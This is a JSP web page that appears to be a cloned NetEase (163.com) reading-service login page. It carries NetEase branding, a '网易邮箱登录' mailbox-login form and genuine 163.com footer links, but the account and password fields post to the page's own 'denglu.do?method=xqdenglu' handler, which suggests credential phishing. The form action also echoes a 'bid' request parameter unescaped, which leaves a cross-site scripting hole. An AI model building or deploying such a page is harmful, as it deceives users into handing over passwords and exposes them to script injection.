<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link type="text/css" rel="stylesheet" href="./login_css/header.css">
	<link type="text/css" rel="stylesheet" href="./login_css/layer.css">
		<link type="text/css" rel="stylesheet" href="./login_css/ursLogin.css">
			<link type="text/css" rel="stylesheet"
				href="./login_css/Ecaptcha_2.0.css">
				<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
				<style>
.m-container .inner {
	width: 100%;
	height: 440px;
	overflow: visible;
	margin: 0 auto;
	background: url(images/6.jpg) 0 0 no-repeat;
	background-position: 50% 50%;
}

.m-outbox {
	width: 960px;
	margin: 0 auto;
	position: relative;
}

.s-header {
	height: 42px;
	margin: 0 auto;
	padding: 55px 0 20px;
}

.s-header .inner {
	width: 960px;
	margin: 0 auto;
	position: relative;
}

.s-header .m-logo {
	width: 185px;
	height: 42px;
	margin: 0
}

.s-header .m-logo a {
	width: 185px;
	height: 42px;
	background: url(image/header.png) 0 -80px no-repeat;
}

.s-header .link {
	position: absolute;
	top: 25px;
	color: #999;
}

.s-header .link1 {
	right: 69px;
}

.s-header .link2 {
	right: 0;
}
</style>
				<title>登录</title>
</head>

<body id="page-163-com">
	<div class="g-hd">
		<div class="s-header">
			<div class="inner">
				<h1 class="m-logo">
					<a href="/">网易阅读</a>
				</h1>
				<a class="link link1" href="/">首页</a> <a class="link link2"
					href="/client">客户端下载</a>
			</div>
		</div>
	</div>
	<div class="m-container">
		<div class="inner">
			<div class="m-outbox">
				<div id="J_Container" class="m-logbox">
					<div id="login-layer" class="m-login-layer m-login-layer-wy"
						style="left:420px;top:30px;position:absolute;margin-left:0;">
						<div class="lytt yy">
							<h4>网易邮箱登录</h4>
						</div>
						<div class="m-login" id="login-container"
							style="width: 250px; height: 226px;">
							
							<form action="denglu.do?method=xqdenglu&bid=<%=request.getParameter("bid") %>" method="post">
								<input type="text" name="uid" placeholder="请输入账号"
									style="margin-top:5px; height:40px; width:240px;" /> <input
									type="password" name="pwd" placeholder="请输入密码"
									style="margin-top:28px; height:40px; width:240px;" /> <input
									type="submit" value="登录"
									style="margin-top:20px; height:40px; width:240px;" />
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="g-ftw">
		<div class="g-ft">
			<div class="m-foot">
				<p class="link">
					<a href="http://www.163.com" target="_blank">网易首页</a><span
						class="sep">|</span> <a
						href="http://gb.corp.163.com/gb/about/overview.html"
						target="_blank">公司简介</a><span class="sep">|</span> <a
						href="http://help.163.com/" target="_blank">客户服务</a><span
						class="sep">|</span> <a
						href="http://corp.163.com/gb/legal/legal.html" target="_blank">相关法律</a><span
						class="sep">|</span> <a href="http://sitemap.163.com/"
						target="_blank">网站导航</a><span class="sep">|</span> <a
						href="http://fankui.163.com/ft/comment.fb?pid=11001"
						target="_blank">意见反馈</a><span class="sep">|</span> <a
						id="J_Service" href="javascript:void(0);">客服电话</a><span
						class="sep">|</span> <a href="/help" target="_blank">帮助中心</a><span
						class="sep">|</span> <a href="http://open.yuedu.163.com/"
						target="_blank">作者中心</a>
				</p>
			</div>
			<div class="m-right">
				<p>
					网易公司版权所有©1997-<span id="j-year">2017</span>
				</p>
			</div>
			<div class="m-share f-cb">
				<label>分享到：</label>
				<div class="share">
					<a href="javascript:;" class="s2 j-wxwx" data-type="xo">微信</a>
				</div>
				<div class="share">
					<a href="javascript:;" class="s4 j-yxyx" data-type="xo">易信</a>
				</div>
				<div class="share">
					<a id="_share_b_tsina"
						href="javascript:(function(){window.open('http://v.t.sina.com.cn/share/share.php?appkey=1560988037&amp;url='+encodeURIComponent('https://yuedu.163.com/')+'&amp;title='+encodeURIComponent('网易云阅读内容丰富、操作便捷，适合作为平时阅读、充电的软件工具，推荐大家都来下载！')+'&amp;pic='+encodeURIComponent('https://yuedust.yuedu.126.net/images/weibo_v3.jpg?2_20120731162723'),'_blank');})()"
						class="s1">微博</a>
				</div>
				<div class="share">
					<a
						href="javascript:(function(){window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?site='+encodeURIComponent('网易云阅读官方网站')+'&amp;url='+encodeURIComponent('https://yuedu.163.com/')+'&amp;title='+encodeURIComponent('网易云阅读--随时随地，品质阅读')+'&amp;pics='+encodeURIComponent('https://yuedust.yuedu.126.net/images/weibo_v3.jpg?3_20131202100833')+'&amp;summary='+encodeURIComponent('网易云阅读内容丰富、操作便捷，适合作为平时阅读、充电的软件工具，推荐大家都来下载！'),'_blank');})()"
						class="s3">QQ空间</a>
				</div>
			</div>

		</div>
	</div>
</body>
</html>
